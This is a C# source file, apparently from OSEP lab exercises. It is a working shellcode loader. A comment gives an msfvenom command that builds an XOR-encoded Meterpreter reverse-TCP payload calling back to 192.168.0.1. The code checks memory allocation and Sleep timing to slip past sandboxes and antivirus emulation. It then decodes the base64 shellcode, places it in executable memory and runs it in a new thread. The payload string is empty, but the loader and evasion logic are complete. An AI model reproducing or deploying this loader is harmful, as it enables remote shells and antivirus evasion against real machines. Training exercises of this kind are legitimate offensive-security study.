using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT 80 -f raw | python3 xor.py -e
namespace OSEP_Labs
{
    class Program
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadid);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess,IntPtr lpAddress,uint dwSize,UInt32 flAllocationType,UInt32 flProtect,UInt32 nndPreferred);

        static void Main(string[] args)
        {
            
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
          
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

            if (mem != null && t2 > 4.9)
            {
                handle();
            }
            
            return;

        }
        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];
            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }

        private static void handle()
        {
            string xorkey = "sD!ChpaN#29F6RhWjv$4";
            string b64xorsc = "";

            byte[] buf;
            buf = xor(Convert.FromBase64String(b64xorsc), Encoding.ASCII.GetBytes(xorkey));
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000, 0x40);
            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
    }
}
